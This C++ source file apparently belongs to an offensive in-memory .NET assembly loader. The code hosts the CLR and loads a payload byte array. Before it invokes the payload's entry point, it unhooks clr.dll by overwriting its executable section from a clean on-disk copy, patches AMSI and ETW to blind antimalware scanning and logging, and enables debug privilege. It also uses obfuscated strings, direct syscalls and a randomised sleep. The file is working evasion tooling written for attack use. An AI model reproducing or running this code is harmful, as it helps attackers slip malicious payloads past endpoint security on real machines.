#include "clr.h"
#include "peb_walk.h"
#include "hash.h"
#include "obfstr.h"
#include "syscalls.h"
#include "amsi.h"
#include "etw.h"
#include <cstring>
#include <objbase.h>
#include <oleauto.h>

#include <metahost.h>
#include <mscoree.h>

#pragma warning(push)
#pragma warning(disable: 4278 4146 4471)
#import "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorlib.tlb" \
    raw_interfaces_only                                    \
    high_property_prefixes("_get","_put","_putref")        \
    rename("ReportEvent", "InteropServices_ReportEvent")   \
    rename("or", "mscorlib_or")
#pragma warning(pop)

static const GUID CLSID_CLRMetaHost_local =
    { 0x9280188D, 0x0E8E, 0x4867, { 0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE } };
static const GUID IID_ICLRMetaHost_local =
    { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
static const GUID IID_ICLRRuntimeInfo_local =
    { 0xBD39D1D2, 0xBA2F, 0x486A, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
static const GUID CLSID_CorRuntimeHost_local =
    { 0xCB2F6723, 0xAB3A, 0x11D2, { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
static const GUID IID_ICorRuntimeHost_local =
    { 0xCB2F6722, 0xAB3A, 0x11D2, { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };

static void unhook_clr_module() {
    HMODULE hClr = nullptr;
    auto clrName = OBFWSTR(L"clr.dll");
    hClr = GetModuleHandleW(clrName.c_str());
    if (!hClr) return;

    UNICODE_STRING clrPath;
    wchar_t pathBuf[MAX_PATH] = {};
    auto sysRoot = OBFWSTR(L"\\SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll");
    wcscpy_s(pathBuf, sysRoot.c_str());
    g_apis.pRtlInitUnicodeString(&clrPath, pathBuf);

    OBJECT_ATTRIBUTES oa = {};
    InitializeObjectAttributes(&oa, &clrPath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
    IO_STATUS_BLOCK iosb = {};

    HANDLE hFile = nullptr;
    NTSTATUS st = sc_NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb,
        FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
    if (st != 0 || !hFile) return;

    HANDLE hSection = nullptr;
    st = sc_NtCreateSection(&hSection, SECTION_MAP_READ, nullptr, nullptr,
        PAGE_READONLY, SEC_IMAGE, hFile);
    sc_NtClose(hFile);
    if (st != 0 || !hSection) return;

    PVOID cleanBase = nullptr;
    SIZE_T viewSize = 0;
    st = sc_NtMapViewOfSection(hSection, (HANDLE)-1, &cleanBase, 0, 0,
        nullptr, &viewSize, 1, 0, PAGE_READONLY);
    sc_NtClose(hSection);
    if (st != 0 || !cleanBase) return;

    IMAGE_DOS_HEADER* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(hClr);
    IMAGE_NT_HEADERS* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(
        reinterpret_cast<uint8_t*>(hClr) + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            uint8_t* srcText = reinterpret_cast<uint8_t*>(cleanBase) + sections[i].VirtualAddress;
            uint8_t* dstText = reinterpret_cast<uint8_t*>(hClr) + sections[i].VirtualAddress;
            SIZE_T textSize = sections[i].Misc.VirtualSize;

            PVOID protAddr = dstText;
            SIZE_T protSize = textSize;
            ULONG oldProtect = 0;
            st = sc_NtProtectVirtualMemory((HANDLE)-1, &protAddr, &protSize,
                PAGE_EXECUTE_READWRITE, &oldProtect);
            if (st == 0) {
                memcpy(dstText, srcText, textSize);
                sc_NtProtectVirtualMemory((HANDLE)-1, &protAddr, &protSize,
                    oldProtect, &oldProtect);
            }
            break;
        }
    }

    sc_NtUnmapViewOfSection((HANDLE)-1, cleanBase);
}

bool execute_assembly(unsigned char* payload, size_t payload_size,
                      const char** args, int argc,
                      const LoaderConfig* config) {

    CoInitializeEx(nullptr, COINIT_MULTITHREADED);

    ICLRMetaHost* pMetaHost = nullptr;
    HRESULT hr = g_apis.pCLRCreateInstance(CLSID_CLRMetaHost_local, IID_ICLRMetaHost_local,
        reinterpret_cast<LPVOID*>(&pMetaHost));
    if (FAILED(hr) || !pMetaHost) { CoUninitialize(); return false; }

    ICLRRuntimeInfo* pRuntimeInfo = nullptr;
    auto version = OBFWSTR(L"v4.0.30319");
    hr = pMetaHost->GetRuntime(version.c_str(), IID_ICLRRuntimeInfo_local,
        reinterpret_cast<LPVOID*>(&pRuntimeInfo));
    if (FAILED(hr) || !pRuntimeInfo) {
        pMetaHost->Release();
        CoUninitialize();
        return false;
    }

    ICorRuntimeHost* pCorHost = nullptr;
    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost_local,
        IID_ICorRuntimeHost_local, reinterpret_cast<LPVOID*>(&pCorHost));
    if (FAILED(hr) || !pCorHost) {
        pRuntimeInfo->Release();
        pMetaHost->Release();
        CoUninitialize();
        return false;
    }

    hr = pCorHost->Start();
    if (FAILED(hr) && hr != S_FALSE) {
        pCorHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        CoUninitialize();
        return false;
    }

    Sleep(200 + (GetTickCount() % 800));

    if (g_apis.pRtlAdjustPrivilege) {
        BOOLEAN prev = FALSE;
        g_apis.pRtlAdjustPrivilege(20, TRUE, FALSE, &prev);
        g_apis.pRtlAdjustPrivilege(20, TRUE, TRUE, &prev);
    }

    if (!config->no_unhook) unhook_clr_module();
    if (!config->no_amsi) {
        resolve_phase5_amsi();
        if (g_apis.pAmsiScanBuffer) patch_amsi_bypass();
    }
    if (!config->no_etw) patch_etw_bypass();

    bool success = false;

    IUnknown* pAppDomainThunk = nullptr;
    hr = pCorHost->GetDefaultDomain(&pAppDomainThunk);
    if (SUCCEEDED(hr) && pAppDomainThunk) {
        mscorlib::_AppDomain* pAppDomain = nullptr;
        hr = pAppDomainThunk->QueryInterface(__uuidof(mscorlib::_AppDomain),
            reinterpret_cast<void**>(&pAppDomain));
        pAppDomainThunk->Release();

        if (SUCCEEDED(hr) && pAppDomain) {
            SAFEARRAYBOUND bound = { static_cast<ULONG>(payload_size), 0 };
            SAFEARRAY* pSA = SafeArrayCreate(VT_UI1, 1, &bound);

            if (pSA) {
                void* saData = nullptr;
                SafeArrayAccessData(pSA, &saData);
                memcpy(saData, payload, payload_size);
                SafeArrayUnaccessData(pSA);

                mscorlib::_Assembly* pAssembly = nullptr;
                hr = pAppDomain->Load_3(pSA, &pAssembly);
                SafeArrayDestroy(pSA);

                if (SUCCEEDED(hr) && pAssembly) {
                    mscorlib::_MethodInfo* pEntryPoint = nullptr;
                    hr = pAssembly->get_EntryPoint(&pEntryPoint);

                    if (SUCCEEDED(hr) && pEntryPoint) {
                        SAFEARRAY* psaArgs = SafeArrayCreateVector(VT_BSTR, 0, argc);
                        for (int i = 0; i < argc && args; i++) {
                            int wlen = MultiByteToWideChar(CP_ACP, 0, args[i], -1, nullptr, 0);
                            wchar_t* warg = new wchar_t[wlen];
                            MultiByteToWideChar(CP_ACP, 0, args[i], -1, warg, wlen);
                            BSTR bstr = SysAllocString(warg);
                            long lIdx = i;
                            SafeArrayPutElement(psaArgs, &lIdx, bstr);
                            SysFreeString(bstr);
                            delete[] warg;
                        }

                        VARIANT vtStringArgs;
                        VariantInit(&vtStringArgs);
                        vtStringArgs.vt = VT_ARRAY | VT_BSTR;
                        vtStringArgs.parray = psaArgs;

                        SAFEARRAY* psaMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
                        long mIdx = 0;
                        SafeArrayPutElement(psaMethodArgs, &mIdx, &vtStringArgs);

                        VARIANT vtObj;
                        VariantInit(&vtObj);
                        vtObj.vt = VT_NULL;

                        VARIANT vtRet;
                        VariantInit(&vtRet);

                        hr = pEntryPoint->Invoke_3(vtObj, psaMethodArgs, &vtRet);
                        success = SUCCEEDED(hr);

                        VariantClear(&vtRet);
                        SafeArrayDestroy(psaMethodArgs);
                        SafeArrayDestroy(psaArgs);

                        pEntryPoint->Release();
                    }
                    pAssembly->Release();
                }
            }
            pAppDomain->Release();
        }
    }

    if (!config->no_amsi) restore_amsi_bypass();
    if (!config->no_etw) restore_etw_bypass();

    pCorHost->Stop();
    pCorHost->Release();
    pRuntimeInfo->Release();
    pMetaHost->Release();
    CoUninitialize();

    return success;
}
